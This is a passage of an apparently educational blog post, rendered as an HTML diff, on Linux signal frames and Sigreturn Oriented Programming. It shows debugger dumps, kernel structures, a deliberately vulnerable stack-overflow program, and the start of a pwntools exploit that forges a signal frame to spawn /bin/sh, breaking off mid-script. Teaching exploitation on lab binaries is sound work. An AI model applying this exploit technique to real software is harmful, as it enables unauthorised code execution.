+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="p">,</span> <span class="mi">896</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">2147483648</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">},</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">element</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl">      <span class="err">}},</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__glibc_reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">4294957584,</span> <span class="err">32767,</span> <span class="err">4160572646,</span> <span class="err">32767,</span> <span class="err">4158322872,</span> <span class="err">32767,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">4160694051,</span> <span class="err">32767,</span> <span class="err">4160319488,</span> <span class="err">32767,</span> <span class="err">110527148,</span> <span class="err">0,</span> <span class="err">1179670611,</span>
+</span></span><span class="line"><span class="cl">      <span class="err">1092,</span> <span class="err">31,</span> <span class="err">0,</span> <span class="err">1088,</span> <span class="err">0}</span>
+</span></span><span class="line"><span class="cl">  <span class="err">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__ssp</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span></code></pre></div><p>The primary portion of the user context structure is held within the field
+<code>struct sigcontext uc_mcontext</code>. This structure holds the registers and execution state
+of the saved execution state. What follows is the definition of the structure.</p>
+<p><code>https://elixir.bootlin.com/linux/latest/source/arch/alpha/include/uapi/asm/sigcontext.h#L5</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#ifndef _ASMAXP_SIGCONTEXT_H
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define _ASMAXP_SIGCONTEXT_H
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">sigcontext</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * What should we have here? I&#39;d probably better use the same
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * stack layout as OSF/1, just in case we ever want to try
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * running their binaries.. 
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * This is the basic layout, but I don&#39;t know if we&#39;ll ever
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * actually fill in all the values..
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">long</span>		<span class="n">sc_onstack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">long</span>		<span class="n">sc_mask</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">long</span>		<span class="n">sc_pc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">long</span>		<span class="n">sc_ps</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">long</span>		<span class="n">sc_regs</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">long</span>		<span class="n">sc_ownedfp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">long</span>		<span class="n">sc_fpregs</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_fpcr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_fp_control</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_reserved1</span><span class="p">,</span> <span class="n">sc_reserved2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_ssize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">char</span> <span class="o">*</span>		<span class="n">sc_sbase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_traparg_a0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_traparg_a1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_traparg_a2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_fp_trap_pc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_fp_trigger_sum</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	 <span class="kt">unsigned</span> <span class="kt">long</span>	<span class="n">sc_fp_trigger_inst</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span></code></pre></div><p>Keep in mind that the implementation of this structure (as well as various others) will
+differ from platform and architecture to meet specific requirements.</p>
+<p>Let&rsquo;s take a look at this structure at runtime to view the specific contents of each
+saved register.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span><span class="p">*(</span><span class="no">struct</span> <span class="no">sigcontext</span> <span class="p">*)(*(</span><span class="no">struct</span> <span class="no">ucontext_t</span><span class="p">*)</span><span class="mi">0x7fffffffd680</span><span class="p">).</span><span class="no">uc_mcontext</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$9</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r8</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r9</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r10</span> <span class="err">=</span> <span class="mi">3849470367813</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r11</span> <span class="err">=</span> <span class="mi">3848290698112</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r12</span> <span class="err">=</span> <span class="mi">3848290698112</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r13</span> <span class="err">=</span> <span class="mi">3848290698112</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r14</span> <span class="err">=</span> <span class="mi">3848290698112</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">r15</span> <span class="err">=</span> <span class="mi">3848290698112</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rdi</span> <span class="err">=</span> <span class="mi">3848290698112</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rsi</span> <span class="err">=</span> <span class="mi">3848290698112</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rbp</span> <span class="err">=</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rbx</span> <span class="err">=</span> <span class="mi">9223372036854775822</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rdx</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rax</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rcx</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rsp</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rip</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">eflags</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">cs</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gs</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fs</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__pad0</span> <span class="err">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">err</span> <span class="err">=</span> <span class="mi">3216465788709089792</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">trapno</span> <span class="err">=</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">oldmask</span> <span class="err">=</span> <span class="mi">93824992235913</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">cr2</span> <span class="err">=</span> <span class="mi">140737488346696</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fpstate</span> <span class="err">=</span> <span class="mi">0x1f7ffdab0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__fpstate_word</span> <span class="err">=</span> <span class="mi">8455707312</span>
+</span></span><span class="line"><span class="cl">  <span class="err">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__reserved1</span> <span class="err">=</span> <span class="err">{</span><span class="mi">1</span><span class="p">,</span> <span class="mi">140737351845968</span><span class="p">,</span> <span class="mi">140737488346672</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="err">93824992235878,</span> <span class="err">5726617664,</span> <span class="err">140737488346696,</span>
+</span></span><span class="line"><span class="cl">    <span class="err">140737488346696,</span> <span class="err">10445461255472785543}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span>
+</span></span></code></pre></div><p>Now let&rsquo;s view the last field present within the runtime signal frame <code>struct siginfo info</code>.
+This field holds various information about the signal which was delivered to the process.
+The following is the expanded definition of the structure.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">siginfo</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">si_signo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">si_errno</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">si_code</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">union</span> <span class="n">__sifields</span> <span class="n">_sifields</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">_si_pad</span><span class="p">[</span><span class="n">SI_MAX_SIZE</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="nf">aligned</span><span class="p">(</span><span class="mi">8</span><span class="p">)))</span> <span class="kt">siginfo_t</span><span class="p">;</span>
+</span></span></code></pre></div><p>The first field <code>si_signo</code> holds the signal number or type which the signal represents. The
+next field <code>si_errno</code> may potentially hold an error code if the signal was generated due
+to an error condition. The field <code>si_code</code> provides additional information about the specific
+event which triggered the signal. The usage of this field depends on the type of signal.</p>
+<p>The field <code>_sifields</code> is a union which typically contains various information on the sender&rsquo;s
+process and user identifier. I will not be elaborating nor expanding on this structure as
+its not relevant.</p>
+<h2 id="sigreturn-oriented-programming">Sigreturn Oriented Programming</h2>
+<p>The technique known as srop exploits the signal handling mechanism due to the fact that
+the execution context is stored on the user space stack; and there is no means of
+verifying whether a runtime signal frame is legitimate.</p>
+<p>Thanks to this, an attacker can with enough control over the stack can forge a malicious
+runtime signal frame for the kernel to load. There are a few means of achieving this
+technique, but we need the ability to invoke the sigreturn system call. We can do this
+via several means.</p>
+<p>One such method is via return oriented programming. If there is a <code>syscall</code> rop gadget
+present within the binary and we can control the ax register, we can leverage it to
+invoke sigreturn.</p>
+<p>On older versions of linux, there also exists a sigreturn gadget which is present at a
+fixed kernel page. This was mapped into user space processes in the form of vDSO as an
+optimization for system calls. This virtual system call mechanism has been deprecated in
+newer versions of linux.</p>
+<p>Using this technique, we can leverage the signal handling routine to populate each
+and every register with whatever value we want. The following is a vulnerable program
+in which we will exploit using srop.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -w -static -no-pie -fno-stack-protector -o vuln vuln.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Bytes read into buffer: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">foo</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Good luck on calling /bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>For the sake of simplicity, we will compile the binary statically and without position
+independent code (PIE). This allows us to use the <code>__restore_rt</code> gadget to call sigreturn,
+which would typically be held within libc; as well as access to the string <code>/bin/sh</code>. It
+makes the example much easier to comprehend and work with as we wont have to worry about
+gaining leaks and calculating offsets.</p>
+<p>We will also disable the stack canary as we need to be able to write over the stack to
+forge our fake runtime signal frame. Keep in mind that we dont actually need to send a
+signal, we can just craft a fake frame then invoke sigreturn to restore the current
+execution context with our fake signal frame.</p>
+<p>The last little cheat that the program provides us is the <code>/bin/sh\x00</code> string. As this
+string is no longer present in recent versions of statically compiled binaries, simply
+using a string within <code>.rodata</code> would be much easier than having to write our own to
+a known writeable region of memory.</p>
+<p>What follows is the high level sequence of events taken to gain a shell on the binary.</p>
+<ol>
+<li>Calculate the offset of the return address of the binary.</li>
+<li>Find the address of important addresses of memory, specifically the <code>/bin/sh</code> string,
+the address of the restore_rt symbol for our return address and the address of a syscall
+gadget for instruction pointer.</li>
+<li>Craft a fake signal frame which populates the registers with the appropriate arguments
+to spawn a shell with execve.</li>
+<li>Craft final payload with padding and forged runtime signal frame.</li>
+</ol>
+<p>First and foremost, lets calculate the offset of the return address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">─────────────────────────────[</span> <span class="nf">BACKTRACE</span> <span class="p">]</span><span class="err">─────────────────────────────</span>
+</span></span><span class="line"><span class="cl"> <span class="err">►</span> <span class="nf">f</span> <span class="mi">0</span>         <span class="mi">0x401838</span> <span class="no">main</span><span class="err">+</span><span class="mi">79</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">f</span> <span class="mi">1</span> <span class="mi">0x6161616161616172</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">f</span> <span class="mi">2</span> <span class="mi">0x6161616161616173</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">f</span> <span class="mi">3</span> <span class="mi">0x6161616161616174</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">f</span> <span class="mi">4</span> <span class="mi">0x6161616161616175</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">f</span> <span class="mi">5</span> <span class="mi">0x6161616161616176</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">f</span> <span class="mi">6</span> <span class="mi">0x6161616161616177</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">f</span> <span class="mi">7</span> <span class="mi">0x6161616161616178</span>
+</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────────────────────────────────────────────────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">cyclic</span> <span class="p">-</span><span class="no">l</span> <span class="no">raaaaaaa</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Finding</span> <span class="no">cyclic</span> <span class="no">pattern</span> <span class="no">of</span> <span class="mi">8</span> <span class="no">bytes</span><span class="p">:</span> <span class="no">b</span><span class="err">&#39;</span><span class="no">raaaaaaa</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">hex</span><span class="p">:</span> <span class="mi">0x7261616161616161</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">136</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span>
+</span></span></code></pre></div><p>So now we know that the offset is at 136 bytes, the return address should be directly
+after this. From here, we need some means of invoking the sigreturn system call. Thankfully
+we have the <code>__restore_rt</code> symbol statically linked within the binary itself so we can
+use that as our gadget. Keep in mind, the first field of the signal frame <code>pretcode</code>
+effectively serves as the return address.</p>
+<p>From here we can populate the values of the signal frame with whatever values we want. In
+this case, we can to call <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>. Once our registers are populated with
+the correct values, we now need to invoke a system call via a <code>syscall</code> gadget to execute
+execve.</p>
+<p>When forging a fake signal frame, we need to be careful not to populate various fields
+with bad values which may potentially corrupt the runtime of our process. There are a
+few requirements which we need in order to forge a valid frame, they are as follows.</p>
+<ol>
+<li>The code segment (CS) register must be correctly restored, on x86_64 this register
+contains the value <code>0x33</code>.</li>
+<li>The fpstate field should not point to a random pointer and should be null. When this
+field is null, Linux will assume no floating point operations and will clear the FPU
+state.</li>
+</ol>
+<p>The rest of the fields that were not mentioned were populated with the values shown at
+runtime by the debugger.</p>
+<p>The full exploit code is shown below.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;vuln&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span><span class="o">=</span><span class="p">{})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x00475020</span><span class="o">+</span><span class="mi">21</span>
+</span></span><span class="line"><span class="cl"><span class="n">restore_rt</span> <span class="o">=</span> <span class="mh">0x00462170</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x00000000004011b8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">restore_rt</span><span class="p">)</span> <span class="c1"># pretcode (return address)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000007</span><span class="p">)</span> <span class="c1"># uc_flags</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># uc_link</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># uc_stack.ss_sp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000ffff00000000</span><span class="p">)</span> <span class="c1"># uc_stack.ss_flags</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># uc_stack.ss_size</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># r8-r15</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="c1"># rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rsi</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rbx</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rdx</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span> <span class="c1"># rax</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rcx</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rsp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="c1"># rip</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000202</span><span class="p">)</span> <span class="c1"># eflags</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x002b000000000033</span><span class="p">)</span> <span class="c1"># ss, fs, gs, cs</span>
